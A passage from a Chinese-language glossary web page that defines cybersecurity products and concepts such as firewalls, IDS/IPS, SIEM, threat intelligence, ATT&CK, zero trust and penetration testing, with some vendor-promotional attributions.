title="1．软硬件"></a>1．软硬件</h2><h3 id="加密机"><a href="#加密机" class="headerlink" title="加密机"></a>加密机</h3><p>主机加密设备，加密机和主机之间使用TCP&#x2F;IP协议通信，所以加密机对主机的类型和主机操作系统无任何特殊的要求。</p><h3 id="CA证书"><a href="#CA证书" class="headerlink" title="CA证书"></a>CA证书</h3><p>为实现双方安全通信提供了电子认证。 </p><p>在因特网、公司内部网或外部网中，使用数字证书实现身份识别和电子信息加密。 </p><p>数字证书中含有密钥对（公钥和私钥）所有者的识别信息，通过验证识别信息的真伪实现对证书持有者身份的认证。</p><h3 id="SSL证书"><a href="#SSL证书" class="headerlink" title="SSL证书"></a>SSL证书</h3><p>SSL证书是数字证书的一种，类似于驾驶证、护照和营业执照的电子副本。 </p><p>因为配置在服务器上，也称为SSL服务器证书。</p><h3 id="防火墙"><a href="#防火墙" class="headerlink" title="防火墙"></a>防火墙</h3><p>主要部署于不同网络或网络安全域之间的出口，通过监测、限制、更改跨越防火墙的数据流，尽可能地对外部屏蔽网络内部的信息、结构和运行状况，有选择地接受外部访问。</p><h3 id="IDS"><a href="#IDS" class="headerlink" title="IDS"></a>IDS</h3><p>入侵检测系统，用于在黑客发起进攻或是发起进攻之前检测到攻击，并加以拦截。 </p><p>IDS是不同于防火墙。防火墙只能屏蔽入侵，而IDS却可以在入侵发生以前，通过一些信息来检测到即将发生的攻击或是入侵并作出反应。</p><h3 id="NIDS"><a href="#NIDS" class="headerlink" title="NIDS"></a>NIDS</h3><p>是Network Intrusion Detection System的缩写，即网络入侵检测系统，主要用于检测Hacker或Cracker 。 </p><p>通过网络进行的入侵行为。NIDS的运行方式有两种，一种是在目标主机上运行以监测其本身的通信信息，另一种是在一台单独的机器上运行以监测所有网络设备的通信信息，比如Hub、路由器。</p><h3 id="IPS"><a href="#IPS" class="headerlink" title="IPS"></a>IPS</h3><p>全称为Intrusion-Prevention System，即入侵防御系统，目的在于及时识别攻击程序或有害代码及其克隆和变种，采取预防措施，先期阻止入侵，防患于未然。 </p><p>或者至少使其危害性充分降低。入侵预防系统一般作为防火墙 和防病毒软件的补充来投入使用。</p><h3 id="杀毒软件"><a href="#杀毒软件" class="headerlink" title="杀毒软件"></a>杀毒软件</h3><p>也称反病毒软件或防毒软件，是用于消除电脑病毒、特洛伊木马和恶意软件等计算机威胁的一类软件。</p><h3 id="反病毒引擎"><a href="#反病毒引擎" class="headerlink" title="反病毒引擎"></a>反病毒引擎</h3><p>通俗理解，就是一套判断特定程序行为是否为病毒程序（包括可疑的）的技术机制。 </p><p>例如奇安信自主研发的QOWL猫头鹰反病毒引擎。</p><h3 id="防毒墙"><a href="#防毒墙" class="headerlink" title="防毒墙"></a>防毒墙</h3><p>区别于部署在主机上的杀毒软件，防毒墙的部署方式与防火墙类似，主要部署于网络出口，用于对病毒进行扫描和拦截，因此防毒墙也被称为反病毒网关。</p><h3 id="老三样"><a href="#老三样" class="headerlink" title="老三样"></a>老三样</h3><p>通常指IDS、防火墙和反病毒三样历史最悠久安全产品。</p><p> </p><h3 id="告警"><a href="#告警" class="headerlink" title="告警"></a>告警</h3><p>指网络安全设备对攻击行为产生的警报。</p><h3 id="误报"><a href="#误报" class="headerlink" title="误报"></a>误报</h3><p>也称为无效告警，通常指告警错误，即把合法行为判断成非法行为而产生了告警。 </p><p>目前，由于攻击技术的快速进步和检测技术的限制，误报的数量非常大，使得安全人员不得不花费大量时间来处理此类告警，已经成为困扰并拉低日常安全处置效率的主要原因。</p><h3 id="漏报"><a href="#漏报" class="headerlink" title="漏报"></a>漏报</h3><p>通常指网络安全设备没有检测出非法行为而没有产生告警。一旦出现漏报，将大幅增加系统被入侵的风险。</p><h3 id="NAC"><a href="#NAC" class="headerlink" title="NAC"></a>NAC</h3><p>全称为Network Access Control，即网络准入控制，其宗旨是防止病毒和蠕虫等新兴黑客技术对企业安全造成危害。 </p><p>借助NAC，客户可以只允许合法的、值得信任的终端设备（例如PC、服务器、PDA）接入网络，而不允许其它设备接入。</p><h3 id="漏扫"><a href="#漏扫" class="headerlink" title="漏扫"></a>漏扫</h3><p>即漏洞扫描，指基于漏洞数据库，通过扫描等手段对指定的远程或者本地计算机系统的安全脆弱性进行检测，发现可利用漏洞的一种安全检测（渗透攻击）行为。</p><h3 id="UTM"><a href="#UTM" class="headerlink" title="UTM"></a>UTM</h3><p>即Unified Threat Management，中文名为统一威胁管理，最早由IDC于2014年提出，即将不同设备的安全能力（最早包括入侵检测、防火墙和反病毒技术），集中在同一网关上，实现统一管理和运维。</p><h3 id="网闸"><a href="#网闸" class="headerlink" title="网闸"></a>网闸</h3><p>网闸是使用带有多种控制功能的固态开关读写介质，连接两个独立主机系统的信息安全设备。 </p><p>由于两个独立的主机系统通过网闸进行隔离，只有以数据文件形式进行的无协议摆渡。</p><h3 id="堡垒机"><a href="#堡垒机" class="headerlink" title="堡垒机"></a>堡垒机</h3><p>运用各种技术手段监控和记录运维人员对网络内的服务器、网络设备、安全设备、数据库等设备的操作行为，以便集中报警、及时处理及审计定责。</p><h3 id="数据库审计"><a href="#数据库审计" class="headerlink" title="数据库审计"></a>数据库审计</h3><p>能够实时记录网络上的数据库活动，对数据库操作进行细粒度审计的合规性管理，对数据库遭受到的风险行为进行告警，对攻击行为进行阻断。 </p><p>它通过对用户访问数据库行为的记录、分析和汇报，用来帮助用户事后生成合规报告、事故追根溯源，同时加强内外部数据库网络行为记录，提高数据资产安全。</p><h3 id="DLP"><a href="#DLP" class="headerlink" title="DLP"></a>DLP</h3><p>数据防泄漏，通过数字资产的精准识别和策略制定，主要用于防止企业的指定数据或信息资产以违反安全策略规定的形式流出企业。</p><h3 id="VPN"><a href="#VPN" class="headerlink" title="VPN"></a>VPN</h3><p>虚拟专用网，在公用网络上建立专用网络，进行加密通讯，通过对数据包的加密和数据包目标地址的转换实现远程访问。</p><h3 id="SD-WAN"><a href="#SD-WAN" class="headerlink" title="SD-WAN"></a>SD-WAN</h3><p>即软件定义广域网，这种服务用于连接广阔地理范围的企业网络、数据中心、互联网应用及云服务。 </p><p>这种服务的典型特征是将网络控制能力通过软件方式云化。 </p><p>通常情况下，SD-WAN都集成有防火墙、入侵检测或者防病毒能力。并且从目前的趋势来看，以安全为核心设计的SD-WAN正在崭露头角，包括奇安信、Fortinet等多家安全厂商开始涉足该领域，并提供了较为完备的内生安全设计。</p><h3 id="路由器"><a href="#路由器" class="headerlink" title="路由器"></a>路由器</h3><p>是用来连接不同子网的中枢，它们工作于OSI7层模型的传输层和网络层。 </p><p>路由器的基本功能就是将网络信息包传输到它们的目的地。一些路由器还有访问控制列表（ACLs），允许将不想要的信息包过滤出去。 </p><p>许多路由器都可以将它们的日志信息注入到IDS系统中，并且自带基础的包过滤（即防火墙）功能。</p><h3 id="网关"><a href="#网关" class="headerlink" title="网关"></a>网关</h3><p>通常指路由器、防火墙、IDS、VPN等边界网络设备。</p><h3 id="WAF"><a href="#WAF" class="headerlink" title="WAF"></a>WAF</h3><p>即Web Application Firewall，即Web应用防火墙，是通过执行一系列针对HTTP&#x2F;HTTPS的安全策略来专门为Web应用提供保护的一款产品。</p><h3 id="SOC"><a href="#SOC" class="headerlink" title="SOC"></a>SOC</h3><p>即Security Operations Center，翻译为安全运行中心或者安全管理平台，通过建立一套实时的资产风险模型，协助管理员进行事件分析、风险分析、预警管理和应急响应处理的集中安全管理系统。</p><h3 id="LAS"><a href="#LAS" class="headerlink" title="LAS"></a>LAS</h3><p>日志审计系统，主要功能是提供日志的收集、检索和分析能力，可为威胁检测提供丰富的上下文。</p><h3 id="NOC"><a href="#NOC" class="headerlink" title="NOC"></a>NOC</h3><p>即Network Operations Center，网络操作中心或网络运行中心，是远程网络通讯的管理、监视和维护中心，是网络问题解决、软件分发和修改、路由、域名管理、性能监视的焦点。</p><h3 id="SIEM"><a href="#SIEM" class="headerlink" title="SIEM"></a>SIEM</h3><p>即Security Information and Event Management，安全信息和事件管理，负责从大量企业安全控件、主机操作系统、企业应用和企业使用的其他软件收集安全日志数据，并进行分析和报告。</p><h3 id="上网行为管理"><a href="#上网行为管理" class="headerlink" title="上网行为管理"></a>上网行为管理</h3><p>是指帮助互联网用户控制和管理对互联网使用的设备。 </p><p>其包括对网页访问过滤、上网隐私保护、网络应用控制、带宽流量管理、信息收发审计、用户行为分析等。</p><h3 id="蜜罐（Honeypot）"><a href="#蜜罐（Honeypot）" class="headerlink" title="蜜罐（Honeypot）"></a>蜜罐（Honeypot）</h3><p>是一个包含漏洞的系统，它摸拟一个或多个易受攻击的主机，给黑客提供一个容易攻击的目标。 </p><p>由于蜜罐没有其它任务需要完成，因此所有连接的尝试都应被视为是可疑的。 </p><p>蜜罐的另一个用途是拖延攻击者对其真正目标的攻击，让攻击者在蜜罐上浪费时间。 </p><p>蜜罐类产品包括蜜网、蜜系统、蜜账号等等。</p><h3 id="沙箱"><a href="#沙箱" class="headerlink" title="沙箱"></a>沙箱</h3><p>沙箱是一种用于安全的运行程序的机制。它常常用来执行那些非可信的程序。 </p><p>非可信程序中的恶意代码对系统的影响将会被限制在沙箱内而不会影响到系统的其它部分。</p><h3 id="沙箱逃逸"><a href="#沙箱逃逸" class="headerlink" title="沙箱逃逸"></a>沙箱逃逸</h3><p>一种识别沙箱环境，并利用静默、欺骗等技术，绕过沙箱检测的现象</p><h3 id="网络靶场"><a href="#网络靶场" class="headerlink" title="网络靶场"></a>网络靶场</h3><p>主要是指通过虚拟环境与真实设备相结合，模拟仿真出真实赛博网络空间攻防作战环境，能够支撑攻防演练、安全教育、网络空间作战能力研究和网络武器装备验证试验平台。</p><p> </p><h2 id="2．技术与服务"><a href="#2．技术与服务" class="headerlink" title="2．技术与服务"></a>2．技术与服务</h2><h3 id="加密技术"><a href="#加密技术" class="headerlink" title="加密技术"></a>加密技术</h3><p>加密技术包括两个元素：算法和密钥。 </p><p>算法是将普通的文本与一串数字（密钥）的结合，产生不可理解的密文的步骤，密钥是用来对数据进行编码和解码的一种算法。 </p><p>密钥加密技术的密码体制分为对称密钥体制和非对称密钥体制两种。相应地，对数据加密的技术分为两类，即对称加密（私人密钥加密）和非对称加密（公开密钥加密）。对称加密的加密密钥和解密密钥相同，而非对称加密的加密密钥和解密密钥不同，加密密钥可以公开而解密密钥需要保密。</p><h3 id="黑名单"><a href="#黑名单" class="headerlink" title="黑名单"></a>黑名单</h3><p>顾名思义，黑名单即不好的名单，凡是在黑名单上的软件、IP地址等，都被认为是非法的。</p><h3 id="白名单"><a href="#白名单" class="headerlink" title="白名单"></a>白名单</h3><p>与黑名单对应，白名单即“好人”的名单，凡是在白名单上的软件、IP等，都被认为是合法的，可以在计算机上运行。</p><h3 id="内网"><a href="#内网" class="headerlink" title="内网"></a>内网</h3><p>通俗的讲就是局域网，比如网吧、校园网、公司内部网等都属于此类。 </p><p>查看IP地址，如果是在以下三个范围之内，就说明我们是处于内网之中的：10.0.0.0—10.255.255.255，172.16.0.0—172.31.255.255，192.168.0.0—192.168.255.255</p><h3 id="外网"><a href="#外网" class="headerlink" title="外网"></a>外网</h3><p>直接连入INTERNET（互连网），可以与互连网上的任意一台电脑互相访问。</p><h3 id="边界防御"><a href="#边界防御" class="headerlink" title="边界防御"></a>边界防御</h3><p>以网络边界为核心的防御模型，以静态规则匹配为基础，强调把所有的安全威胁都挡在外网。</p><h3 id="南北向流量"><a href="#南北向流量" class="headerlink" title="南北向流量"></a>南北向流量</h3><p>通常指数据中心内外部通信所产生的的流量。</p><h3 id="东西向流量"><a href="#东西向流量" class="headerlink" title="东西向流量"></a>东西向流量</h3><p>通常指数据中心内部不同主机之间互相通信所产生的的流量。</p><h3 id="规则库"><a href="#规则库" class="headerlink" title="规则库"></a>规则库</h3><p>网络安全的核心数据库，类似于黑白名单，用于存储大量安全规则，一旦访问行为和规则库完成匹配，则被认为是非法行为。所以有人也将规则库比喻为网络空间的法律。</p><h3 id="下一代"><a href="#下一代" class="headerlink" title="下一代"></a>下一代</h3><p>网络安全领域经常用到，用于表示产品或者技术有较大幅度的创新，在能力上相对于传统方法有明显的进步，通常缩写为NG（Next Gen）。 </p><p>例如NGFW（下一代防火墙）、NGSOC（下一代安全管理平台）等。</p><h3 id="大数据安全分析"><a href="#大数据安全分析" class="headerlink" title="大数据安全分析"></a>大数据安全分析</h3><p>区别于传统被动规则匹配的防御模式，以主动收集和分析大数据的方法，找出其中可能存在的安全威胁，因此也称数据驱动安全。 </p><p>该理论最早由奇安信于2015年提出。</p><h3 id="EPP"><a href="#EPP" class="headerlink" title="EPP"></a>EPP</h3><p>全称为Endpoint Protection Platform，翻译为端点保护平台，部署在终端设备上的安全防护解决方案,用于防止针对终端的恶意软件、恶意脚本等安全威胁，通常与EDR进行联动。</p><h3 id="EDR"><a href="#EDR" class="headerlink" title="EDR"></a>EDR</h3><p>全称Endpoint Detection &amp; Response，即端点检测与响应，通过对端点进行持续检测，同时通过应用程序对操作系统调用等异常行为分析，检测和防护未知威胁，最终达到杀毒软件无法解决未知威胁的目的。</p><h3 id="NDR"><a href="#NDR" class="headerlink" title="NDR"></a>NDR</h3><p>全称Network Detection &amp; Response，即网络检测与响应，通过对网络侧流量的持续检测和分析，帮助企业增强威胁响应能力，提高网络安全的可见性和威胁免疫力。</p><h3 id="安全可视化"><a href="#安全可视化" class="headerlink" title="安全可视化"></a>安全可视化</h3><p>指在网络安全领域中的呈现技术，将网络安全加固、检测、防御、响应等过程中的数据和结果转换成图形界面，并通过人机交互的方式进行搜索、加工、汇总等操作的理论、方法和技术。</p><h3 id="NTA"><a href="#NTA" class="headerlink" title="NTA"></a>NTA</h3><p>网络流量分析（NTA）的概念是Gartner于2013年首次提出的，位列五种检测高级威胁的手段之一。 </p><p>它融合了传统的基于规则的检测技术，以及机器学习和其他高级分析技术，用以检测企业网络中的可疑行为，尤其是失陷后的痕迹。</p><h3 id="MDR"><a href="#MDR" class="headerlink" title="MDR"></a>MDR</h3><p>全称Managed Detection &amp; Response，即托管检测与响应，依靠基于网络和主机的检测工具来识别恶意模式。 </p><p>此外，这些工具通常还会从防火墙之内的终端收集数据，以便更全面地监控网络活动。</p><h3 id="应急响应"><a href="#应急响应" class="headerlink" title="应急响应"></a>应急响应</h3><p>通常是指一个组织为了应对各种意外事件的发生所做的准备以及在事件发生后所采取的措施。</p><h3 id="XDR"><a href="#XDR" class="headerlink" title="XDR"></a>XDR</h3><p>通常指以检测和响应技术为核心的网络安全策略的统称，包括EDR、NDR、MDR等。</p><h3 id="安全运营"><a href="#安全运营" class="headerlink" title="安全运营"></a>安全运营</h3><p>贯穿产品研发、业务运行、漏洞修复、防护与检测、应急响应等一系列环节，实行系统的管理方法和流程，将各个环节的安全防控作用有机结合，保障整个业务的安全性。</p><h3 id="威胁情报"><a href="#威胁情报" class="headerlink" title="威胁情报"></a>威胁情报</h3><p>根据Gartner的定义，威胁情报是某种基于证据的知识，包括上下文、机制、标示、含义和能够执行的建议，这些知识与资产所面临已有的或酝酿中的威胁或危害相关，可用于资产相关主体对威胁或危害的响应或处理决策提供信息支持。根据使用对象的不同，威胁情报主要分为人读情报和机读情报。</p><h3 id="TTP"><a href="#TTP" class="headerlink" title="TTP"></a>TTP</h3><p>主要包括三要素，战术Tactics、技术Techniques和过程Procedures，是描述高级威胁组织及其攻击的重要指标，作为威胁情报的一种重要组成部分，TTP可为安全分析人员提供决策支撑。</p><h3 id="IOC"><a href="#IOC" class="headerlink" title="IOC"></a>IOC</h3><p>中文名为失陷标示：用以发现内部被APT团伙、木马后门、僵尸网络控制的失陷主机，类型上往往是域名、URL等。 </p><p>目前而言，IOC是应用最为广泛的威胁情报，因为其效果最为直接。一经匹配，则意味着存在已经失陷的主机。</p><h3 id="上下文"><a href="#上下文" class="headerlink" title="上下文"></a>上下文</h3><p>从文章的上下文引申而来，主要是指某项威胁指标的关联信息，用于实现更加精准的安全匹配和检测。</p><h3 id="STIX"><a href="#STIX" class="headerlink" title="STIX"></a>STIX</h3><p>STIX是一种描述网络威胁信息的结构化语言，能够以标准化和结构化的方式获取更广泛的网络威胁信息，常用于威胁情报的共享与交换，目前在全球范围内使用最为广泛。 </p><p>STIX在定义了8中构件的1.0版本基础上，已经推出了定义了12中构件的2.0版本。</p><h3 id="杀伤链"><a href="#杀伤链" class="headerlink" title="杀伤链"></a>杀伤链</h3><p>杀伤链最早来源于军事领域，用于描述进攻一方各个阶段的状态。 </p><p>在网络安全领域，这一概念最早由洛克希德-马丁公司提出，英文名称为Kill Chain，也称作网络攻击生命周期，包括侦查追踪、武器构建、载荷投递、漏洞利用、安装植入、命令控制、目标达成等七个阶段，来识别和防止入侵。</p><h3 id="ATT-amp-CK"><a href="#ATT-amp-CK" class="headerlink" title="ATT&amp;CK"></a>ATT&amp;CK</h3><p>可以简单理解为描述攻击者技战术的知识库。 </p><p>MITRE在2013年推出了该模型，它是根据真实的观察数据来描述和分类对抗行为。 </p><p>ATT&amp;CK将已知攻击者行为转换为结构化列表，将这些已知的行为汇总成战术和技术，并通过几个矩阵以及结构化威胁信息表达式（STIX）、指标信息的可信自动化交换（TAXII）来表示。</p><h3 id="钻石模型"><a href="#钻石模型" class="headerlink" title="钻石模型"></a>钻石模型</h3><p>钻石模型在各个领域的应用都十分广泛，在网络安全领域，钻石模型首次建立了一种将科学原理应用于入侵分析的正式方法： </p><p>可衡量、可测试和可重复——提供了一个对攻击活动进行记录、(信息)合成、关联的简单、正式和全面的方法。 </p><p>这种科学的方法和简单性可以改善分析的效率、效能和准确性。</p><h3 id="关联分析"><a href="#关联分析" class="headerlink" title="关联分析"></a>关联分析</h3><p>又称关联挖掘，就是在交易数据、关系数据或其他信息载体中，查找存在于项目集合或对象集合之间的频繁模式、关联、相关性或因果结构。 </p><p>在网络安全领域主要是指将不同维度、类型的安全数据进行关联挖掘，找出其中潜在的入侵行为。</p><h3 id="态势感知"><a href="#态势感知" class="headerlink" title="态势感知"></a>态势感知</h3><p>是一种基于环境的、动态、整体地洞悉安全风险的能力，是以安全大数据为基础，从全局视角提升对安全威胁的发现识别、理解分析、响应处置能力的一种方式，最终是为了决策与行动，是安全能力的落地。</p><h3 id="探针"><a href="#探针" class="headerlink" title="探针"></a>探针</h3><p>也叫作网络安全探针或者安全探针，可以简单理解为赛博世界的摄像头，部署在网络拓扑的关键节点上，用于收集和分析流量和日志，发现异常行为，并对可能到来的攻击发出预警。</p><h3 id="网络空间测绘"><a href="#网络空间测绘" class="headerlink" title="网络空间测绘"></a>网络空间测绘</h3><p>用搜索引擎技术来提供交互，让人们可以方便的搜索到网络空间上的设备。 </p><p>相对于现实中使用的地图，用各种测绘方法描述和标注地理位置，用主动或被动探测的方法，来绘制网络空间上设备的网络节点和网络连接关系图，及各设备的画像。</p><h3 id="SOAR"><a href="#SOAR" class="headerlink" title="SOAR"></a>SOAR</h3><p>全称Security Orchestration, Automation and Response，意即安全编排自动化与响应，主要通过剧本化、流程化的指令，对入侵行为采取的一系列自动化或者半自动化响应处置动作。</p><h3 id="UEBA"><a href="#UEBA" class="headerlink" title="UEBA"></a>UEBA</h3><p>全称为User and Entity Behavior Analytics，即用户实体行为分析，一般通过大数据分析的方法，分析用户以及IT实体的行为，从而判断是否存在非法行为。</p><h3 id="内存保护"><a href="#内存保护" class="headerlink" title="内存保护"></a>内存保护</h3><p>内存保护是操作系统对电脑上的内存进行访问权限管理的一个机制。内存保护的主要目的是防止某个进程去访问不是操作系统配置给它的寻址空间。</p><h3 id="RASP"><a href="#RASP" class="headerlink" title="RASP"></a>RASP</h3><p>全称为Runtime application self-protection，翻译成应用运行时自我保护。 </p><p>在2014年时由Gartner提出，它是一种新型应用安全保护技术，它将保护程序像疫苗一样注入到应用程序中，应用程序融为一体，能实时检测和阻断安全攻击，使应用程序具备自我保护能力，当应用程序遭受到实际攻击伤害，就可以自动对其进行防御，而不需要进行人工干预。</p><h3 id="包检测"><a href="#包检测" class="headerlink" title="包检测"></a>包检测</h3><p>对于流量包、数据包进行拆包、检测的行为。</p><h3 id="深度包检测"><a href="#深度包检测" class="headerlink" title="深度包检测"></a>深度包检测</h3><p>Deep Packet Inspection，缩写为 DPI，又称完全数据包探测（complete packet inspection）或信息萃取（Information eXtraction，IX），是一种计算机网络数据包过滤技术，用来检查通过检测点之数据包的数据部分（亦可能包含其标头），以搜索不匹配规范之协议、病毒、垃圾邮件、入侵迹象。</p><h3 id="全流量检测"><a href="#全流量检测" class="headerlink" title="全流量检测"></a>全流量检测</h3><p>全流量主要体现在三个“全”上，即全流量采集与保存，全行为分析以及全流量回溯。 </p><p>通过全流量分析设备，实现网络全流量采集与保存、全行为分析与全流量回溯，并提取网络元数据上传到大数据分析平台实现更加丰富的功能。</p><h3 id="元数据"><a href="#元数据" class="headerlink" title="元数据"></a>元数据</h3><p>元数据（Metadata），又称中介数据、中继数据，为描述数据的数据（data about data），主要是描述数据属性（property）的信息，用来支持如指示存储位置、历史数据、资源查找、文件记录等功能。</p><h3 id="欺骗检测"><a href="#欺骗检测" class="headerlink" title="欺骗检测"></a>欺骗检测</h3><p>以构造虚假目标来欺骗并诱捕攻击者，从而达到延误攻击节奏，检测和分析攻击行为的目的。</p><h3 id="微隔离"><a href="#微隔离" class="headerlink" title="微隔离"></a>微隔离</h3><p>顾名思义是细粒度更小的网络隔离技术，能够应对传统环境、虚拟化环境、混合云环境、容器环境下对于东西向流量隔离的需求，重点用于阻止攻击者进入企业数据中心网络内部后的横向平移。</p><h3 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h3><p>常见于逆向工程或者逆向分析，简单而言，一切从产品中提取原理及设计信息并应用于再造及改进的行为，都是逆向工程。 </p><p>在网络安全中，更多的是调查取证、恶意软件分析等。</p><h3 id="无代理安全"><a href="#无代理安全" class="headerlink" title="无代理安全"></a>无代理安全</h3><p>在终端安全或者虚拟化安全防护中，往往需要在每一台主机或者虚机上安装agent（代理程序）来实现，这种方式往往需要消耗大量的资源。 </p><p>而无代理安全则不用安装agent，可以减少大量的部署运维工作，提升管理效率。</p><h3 id="CWPP"><a href="#CWPP" class="headerlink" title="CWPP"></a>CWPP</h3><p>全称Cloud Workload Protection Platform，意为云工作负载保护平台，主要是指对云上应用和工作负载（包括虚拟主机和容器主机上的工作负载）进行保护的技术，实现了比过去更加细粒度的防护，是现阶段云上安全的最后一道防线。</p><h3 id="CSPM"><a href="#CSPM" class="headerlink" title="CSPM"></a>CSPM</h3><p>云安全配置管理，能够对基础设施安全配置进行分析与管理。这些安全配置包括账号特权、网络和存储配置、以及安全配置（如加密设置）。如果发现配置不合规，CSPM会采取行动进行修正。</p><h3 id="CASB"><a href="#CASB" class="headerlink" title="CASB"></a>CASB</h3><p>全称Cloud Access Security Broker，即云端接入安全代理。作为部署在客户和云服务商之间的安全策略控制点，是在访问基于云的资源时企业实施的安全策略。</p><h3 id="防爬"><a href="#防爬" class="headerlink" title="防爬"></a>防爬</h3><p>意为防爬虫，主要是指防止网络爬虫从自身网站中爬取信息。网络爬虫是一种按照一定的规则，自动地抓取网络信息的程序或者脚本。</p><h3 id="安全资源池"><a href="#安全资源池" class="headerlink" title="安全资源池"></a>安全资源池</h3><p>安全资源池是多种安全产品虚拟化的集合，涵盖了服务器终端、网络、业务、数据等多种安全能力。</p><h3 id="IAM"><a href="#IAM" class="headerlink" title="IAM"></a>IAM</h3><p>全称为Identity and Access Management，即身份与访问管理，经常也被叫做身份认证。</p><h3 id="4A"><a href="#4A" class="headerlink" title="4A"></a>4A</h3><p>即认证Authentication、授权Authorization、账号Account、审计Audit，即融合统一用户账号管理、统一认证管理、统一授权管理和统一安全审计四要素后的解决方案将，涵盖单点登录（SSO）等安全功能。</p><h3 id="Access-Control-list-ACL"><a href="#Access-Control-list-ACL" class="headerlink" title="Access Control list(ACL)"></a>Access Control list(ACL)</h3><p>访问控制列表。</p><h3 id="多因子认证"><a href="#多因子认证" class="headerlink" title="多因子认证"></a>多因子认证</h3><p>主要区别于单一口令认证的方式，要通过两种以上的认证机制之后，才能得到授权，使用计算机资源。 </p><p>例如，用户要输入PIN码，插入银行卡，最后再经指纹比对，通过这三种认证方式，才能获得授权。这种认证方式可以降低单一口令失窃的风险，提高安全性。</p><h3 id="特权账户管理"><a href="#特权账户管理" class="headerlink" title="特权账户管理"></a>特权账户管理</h3><p>简称PAM。由于特权账户往往拥有很高的权限，因此一旦失窃或被滥用，会给机构带来非常大的网络安全风险。所以，特权账户管理往往在显得十分重要。 </p><p>其主要原则有：杜绝特权凭证共享、为特权使用赋以个人责任、为日常管理实现最小权限访问模型、对这些凭证执行的活动实现审计功能。</p><h3 id="零信任"><a href="#零信任" class="headerlink" title="零信任"></a>零信任</h3><p>零信任并不是不信任，而是作为一种新的身份认证和访问授权理念，不再以网络边界来划定可信或者不可信，而是默认不相信任何人、网络以及设备，采取动态认证和授权的方式，把访问者所带来的的网络安全风险降到最低。</p><h3 id="SDP"><a href="#SDP" class="headerlink" title="SDP"></a>SDP</h3><p>全称为Software Defined Perimeter，即软件定义边界，由云安全联盟基于零信任网络提出，是围绕某个应用或某一组应用创建的基于身份和上下文的逻辑访问边界。</p><h3 id="Security-as-a-Service"><a href="#Security-as-a-Service" class="headerlink" title="Security as a Service"></a>Security as a Service</h3><p>安全即服务，通常可理解为以SaaS的方式，将安全能力交付给客户。</p><h3 id="同态加密"><a href="#同态加密" class="headerlink" title="同态加密"></a>同态加密</h3><p>同态加密是一类具有特殊自然属性的加密方法，此概念是Rivest等人在20世纪70年代首先提出的，与一般加密算法相比，同态加密除了能实现基本的加密操作之外，还能实现密文间的多种计算功能。</p><h3 id="量子计算"><a href="#量子计算" class="headerlink" title="量子计算"></a>量子计算</h3><p>是一种遵循量子力学规律调控量子信息单元进行计算的新型计算模式，目前已经逐渐应用于加密和通信传输。</p><h3 id="可信计算"><a href="#可信计算" class="headerlink" title="可信计算"></a>可信计算</h3><p>是一项由可信计算组（可信计算集群，前称为TCPA）推动和开发的技术。 </p><p>可信计算是在计算和通信系统中广泛使用基于硬件安全模块支持下的可信计算平台，以提高系统整体的安全性。</p><h3 id="拟态防御"><a href="#拟态防御" class="headerlink" title="拟态防御"></a>拟态防御</h3><p>核心实现是一种基于网络空间内生安全机理的动态异构冗余构造（Dynamic Heterogeneous Redundancy，DHR)，为应对网络空间中基于未知漏洞、后门或病毒木马等的未知威胁，提供具有普适创新意义的防御理论和方法。</p><h3 id="区块链"><a href="#区块链" class="headerlink" title="区块链"></a>区块链</h3><p>英文名为blockchain，它是一个共享数据库，存储于其中的数据或信息，具有“不可伪造”、“全程留痕”、“可以追溯”、“公开透明”、“集体维护”等特征。</p><h3 id="远程浏览器"><a href="#远程浏览器" class="headerlink" title="远程浏览器"></a>远程浏览器</h3><p>鉴于浏览器往往成为黑客攻击的入口，因此将浏览器部署在远程的一个“浏览器服务器池”中。 </p><p>这样一来，这些浏览器所在的服务器跟用户所在环境中的终端和网络是隔离的，从而使得客户所在网络的暴露面大大降低。 </p><p>这种服务也类似于虚拟桌面、云手机等产品。</p><h3 id="云手机"><a href="#云手机" class="headerlink" title="云手机"></a>云手机</h3><p>云手机采用全新的VMI（Virtual Mobile Infrastructure虚拟移动设施，与PC云桌面类似）技术，为员工提供一个独立的移动设备安全虚拟手机，业务应用和数据仅在服务端运行和存储，个人终端上仅做加密流媒体呈现和触控，从而有效保障企业数据的安全性。</p><h3 id="风控"><a href="#风控" class="headerlink" title="风控"></a>风控</h3><p>也称大数据风控，是指利用大数据分析的方法判断业务可能存在的安全风险，目前该技术主要用于金融信贷领域，防止坏账的发生。</p><h3 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h3><p>为了证明网络防御按照预期计划正常运行而提供的一种机制，通常会邀请专业公司的攻击团队，按照一定的规则攻击既定目标，从而找出其中存在的漏洞或者其他安全隐患，并出具测试报告和整改建议。 </p><p>其目的在于不断提升系统的安全性。</p><h3 id="安全众测"><a href="#安全众测" class="headerlink" title="安全众测"></a>安全众测</h3><p>借助众多白帽子的力量，针对目标系统在规定时间内进行漏洞悬赏测试。 </p><p>您在收到有效的漏洞后，按漏洞风险等级给予白帽子一定的奖励。通常情况下是按漏洞付费，性价比较高。 </p><p>同时，不同白帽子的技能研究方向可能不同，在进行测试的时候更为全面。</p><h3 id="内生安全"><a href="#内生安全" class="headerlink" title="内生安全"></a>内生安全</h3><p>由奇安信集团董事长齐向东在2019北京网络安全大会上首次提出，指的是不断从信息化系统内生长出的安全能力，能伴随业务的增长而持续提升，持续保证业务安全。 </p><p>内生安全有三个特性，即依靠信息化系统与安全系统的聚合、业务数据与安全数据的聚合以及IT人才和安全人才的聚合，从信息化系统的内部，不断长出自适应、自主和自成长的安全能力。</p><h3 id="内生安全框架"><a href="#内生安全框架" class="headerlink" title="内生安全框架"></a>内生安全框架</h3><p>为推动内生安全的落地，奇安信推出了内生安全框架。 </p><p>该框架从顶层视角出发，支撑各行业的建设模式从“局部整改外挂式”，走向“深度融合体系化”；从工程实现的角度，将安全需求分步实施，逐步建成面向未来的安全体系；内生安全框架能够输出实战化、体系化、常态化的安全能力，构建出动态防御、主动防御、纵深防御、精准防护、整体防控、联防联控的网络安全防御体系。 </p><p>内生安全框架包含了总结出了29个安全区域场景和 79类安全组件。</p><h3 id="PPDR"><a href="#PPDR" class="headerlink" title="PPDR"></a>PPDR</h3><p>英文全称为Policy Protection Detection Response，翻译为策略、防护、检测和响应。 </p><p>主要以安全策略为核心，通过一致性检查、流量统计、异常分析、模式匹配以及基于应用、目标、主机、网络的入侵检查等方法进行安全漏洞检测。</p><h3 id="CARTA"><a href="#CARTA" class="headerlink" title="CARTA"></a>CARTA</h3><p>全称为Continuous Adaptive Risk and Trust 